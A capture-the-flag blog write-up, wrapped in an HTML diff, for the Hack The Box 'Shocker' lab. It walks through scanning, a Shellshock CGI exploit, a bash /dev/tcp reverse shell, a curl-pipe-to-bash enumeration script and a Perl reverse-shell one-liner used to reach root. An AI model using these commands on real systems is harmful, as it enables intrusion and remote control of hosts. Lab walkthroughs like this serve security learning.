@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Shocker - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-shocker"><a href="#Hack-The-Box-shocker" class="headerlink" title="Hack The Box - shocker"></a>Hack The Box - Shocker</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.Its IP address is <code>10.10.10.56</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/shock/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/shocker)
+ |
+ |-->{SFire129}#nmap -A -v 10.10.10.56
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 11:50 EDT
+ Host is up (0.097s latency).
+ Not shown: 998 closed ports
+ PORT     STATE SERVICE VERSION
+ 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+ | http-methods:
+ |_  Supported Methods: POST OPTIONS GET HEAD
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ |_http-title: Site doesn't have a title (text/html).
+ 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey:
+ |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+ |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+ |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+ TCP/IP fingerprint:
+ OS:SCAN(V=7.80%E=4%D=5/27%OT=80%CT=1%CU=32937%PV=Y%DS=2%DC=T%G=Y%TM=5ECE8C5
+ OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
+ OS:(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST1
+ OS:1NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+ OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+ OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+ OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+ OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+ OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+ OS:=S)
+ 
+ Uptime guess: 0.624 days (since Tue May 26 20:51:44 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=258 (Good luck!)
+ IP ID Sequence Generation: All zeros
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ TRACEROUTE (using port 443/tcp)
+ HOP RTT      ADDRESS
+ 1   93.26 ms 10.10.14.1
+ 2   93.81 ms 10.10.10.56
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 11:50
+ Completed NSE at 11:50, 0.00s elapsed
+ Initiating NSE at 11:50
+ Completed NSE at 11:50, 0.00s elapsed
+ Initiating NSE at 11:50
+ Completed NSE at 11:50, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 27.90 seconds
+            Raw packets sent: 1189 (56.342KB) | Rcvd: 1081 (46.730KB)<br></figure></pre>
+<p>The server run a service in the port 80 and 2222. Launch <code>Gobuster</code> for list the web server.
+
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/shocker)
+ |
+ |-->{SFire129}#gobuster -w /usr/share/wordlists/dirb/small.txt dir --url http://10.10.10.56/
+ ===============================================================
+ Gobuster v3.0.1
+ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+ ===============================================================
+ [+] Url:            http://10.10.10.56/
+ [+] Threads:        10
+ [+] Wordlist:       /usr/share/wordlists/dirb/small.txt
+ [+] Status codes:   200,204,301,302,307,401,403
+ [+] User Agent:     gobuster/3.0.1
+ [+] Timeout:        10s
+ ===============================================================
+ 2020/05/27 13:23:25 Starting gobuster
+ ===============================================================
+ /cgi-bin/ (Status: 403)
+ ===============================================================
+ 2020/05/27 13:23:35 Finished
+ ===============================================================<br></figure></pre>
+ <p>Now, search the extension files <code>.sh</code> and <code>.pl</code>.
+ 
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/shocker)
+ |
+ |-->{SFire129}#gobuster -w /usr/share/wordlists/dirb/small.txt dir --url http://10.10.10.56/cgi-bin- s 200,204,301,302,307,401,403 -x sh,pl
+ ===============================================================
+ Gobuster v3.0.1
+ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+ ===============================================================
+ [+] Url:            http://10.10.10.56/cgi-bin
+ [+] Threads:        10
+ [+] Wordlist:       /usr/share/wordlists/dirb/small.txt
+ [+] Status codes:   200,204,301,302,307,401,403
+ [+] User Agent:     gobuster/3.0.1
+ [+] Extensions:     sh,pl
+ [+] Timeout:        10s
+ ===============================================================
+ 2020/05/27 13:32:57 Starting gobuster
+ ===============================================================
+ /user.sh (Status: 200)
+ ===============================================================
+ 2020/05/27 13:33:26 Finished
+ ===============================================================<br></figure></pre>
+ <img src="/images/hackthebox/exploit/shock/1.png" alt=""></p>
+<p>The content file is:
+ <img src="/images/hackthebox/exploit/shock/2.png" alt=""></p>
+ <p>Launch the Burpsuite, in the section proxy/options, check <code>Intercept server responses</code>
+ <img src="/images/hackthebox/exploit/shock/3.png" alt=""></p>
+ <p>Configure the Burpsuite with the proxy 127.0.0.1:8081 for redirect to 10.10.10.56:80 and launch the nmap. 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/shocker)
+ |
+ |-->{SFire129}#nmap  -sV -p8081 --script=http-shellshock --script-args="uri=/cgi-bin/user.sh,cmd=ls" 127.0.0.1
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 15:25 EDT
+ Nmap scan report for localhost (127.0.0.1)
+ Host is up (0.00015s latency).
+ 
+ PORT     STATE SERVICE VERSION
+ 8081/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ | http-shellshock:
+ |   VULNERABLE:
+ |   HTTP Shellshock vulnerability
+ |     State: VULNERABLE (Exploitable)
+ |     IDs:  CVE:CVE-2014-6271
+ |       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+ |       is executing commands injected via malicious HTTP headers.
+ |
+ |     Disclosure date: 2014-09-24
+ |     Exploit results:
+ |       !DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"
+ |    html  head 
+ |    title 500 Internal Server Error /title 
+ |    /head  body 
+ |    h1 Internal Server Error /h1 
+ |    p The server encountered an internal error or
+ |   misconfiguration and was unable to complete
+ |   your request. /p 
+ |    p Please contact the server administrator at
+ |    webmaster@localhost to inform them of the time this error occurred,
+ |    and the actions you performed just before this error. /p 
+ |    p More information about this error may be available
+ |   in the server error log. /p 
+ |    hr 
+ |    address Apache/2.4.18 (Ubuntu) Server at localhost Port 8081 /address 
+ |    /body  /html 
+ |
+ |     References:
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+ |       http://www.openwall.com/lists/oss-security/2014/09/24/10
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ |_      http://seclists.org/oss-sec/2014/q3/685
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 21.86 seconds<br></figure></pre>
+ <p>The result show vulnerability Shellshock Intercepting traffic.
+ <img src="/images/hackthebox/exploit/shock/4.png" alt=""></p>
+ <p>Comment the line into the scritp Shellshock and relaunch
+ <img src="/images/hackthebox/exploit/shock/4.1.png" alt=""></p>
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/shocker)
+ |
+ |-->{SFire129}#nmap  -sV -p8081 --script=http-shellshock --script-args="uri=/cgi-bin/user.sh,cmd=ls" 127.0.0.1
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 15:47 EDT
+ Nmap scan report for localhost (127.0.0.1)
+ Host is up (0.000086s latency).
+ 
+ PORT     STATE SERVICE VERSION
+ 8081/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+ |_http-server-header: Apache/2.4.18 (Ubuntu)
+ | http-shellshock:
+ |   VULNERABLE:
+ |   HTTP Shellshock vulnerability
+ |     State: VULNERABLE (Exploitable)
+ |     IDs:  CVE:CVE-2014-6271
+ |       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+ |       is executing commands injected via malicious HTTP headers.
+ |
+ |     Disclosure date: 2014-09-24
+ |     Exploit results:
+ |       user.sh
+ |
+ |     References:
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+ |       http://www.openwall.com/lists/oss-security/2014/09/24/10
+ |_      http://seclists.org/oss-sec/2014/q3/685
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds<br></figure></pre>
+ <p>Send the command <code> echo; /bin/bash ls</code> in the repeater section burpsuite.
+ <img src="/images/hackthebox/exploit/shock/5.png" alt=""></p>
+ <p>Send the command <code>whoami</code>
+ <img src="/images/hackthebox/exploit/shock/6.png" alt=""></p>
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>From the reapeter send the script <code>echo; /bin/bash -i >& /dev/tcp/10.10.14.27/4445 0">"&1</code> for create reverse shell on netcat listener on port 445 in Kali linux.
+<p>Run the Metasploit, search <code>Eternalshocker</code> exploit, configure and run it.
+ <img src="/images/hackthebox/exploit/shock/7.png" alt=""></p>
+ <p>Run the netcat for reverse shell.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/shocker)
+ |
+ |-->{SFire129}#nc -nvlp 4445
+ listening on [any] 4445 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.56] 48986
+ bash: no job control in this shell
+ shelly@Shocker:/usr/lib/cgi-bin$ whoami
+ shelly
+ shelly@Shocker:/usr/lib/cgi-bin$ which python
+ which python
+ shelly@Shocker:/usr/lib/cgi-bin$ which python3
+ /usr/bin/python3
+ shelly@Shocker:/usr/lib/cgi-bin$  python3 -c 'import pty; pty.spawn("/bin/sh")'
+ <-bin$  python3 -c 'import pty; pty.spawn("/bin/sh")'
+ $ pwd
+ pwd
+ /usr/lib/cgi-bin
+ $</figure></pre>
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get Privileges"></a>Get Privileges</h2>
+ <p>With the script <code>LinEnum.sh</code>, get from the Kali linux web  server and run <code>curl 10.10.14.27:8082/LinEnum.sh | bash</code> for enumerate the system.
+  <img src="/images/hackthebox/exploit/shock/11.png" alt=""></p>
+  <p>The script show the vulnerability in <code>sudo</code> command
+  <img src="/images/hackthebox/exploit/shock/12.png" alt=""></p>
+  <p>Run the script perl <code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>  into the shell with the another netcat listener over different port.
+  <img src="/images/hackthebox/exploit/shock/13.png" alt=""></p>
+ <p>Run the script and review the privileges.
+  <img src="/images/hackthebox/exploit/shock/10.png" alt=""></p>
+<h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain"> listening on [any] 1234 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.56] 48986
+ bash: no job control in this shell
+ $ whoami
+ root
+ $cat /home/shelly/user.txt
+ ***Here you could be find the user flag***
+ $cat /root/root.txt
+ ***Here you could be find the user flag***</figure></pre>
+
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-27</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Eternalshocker</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
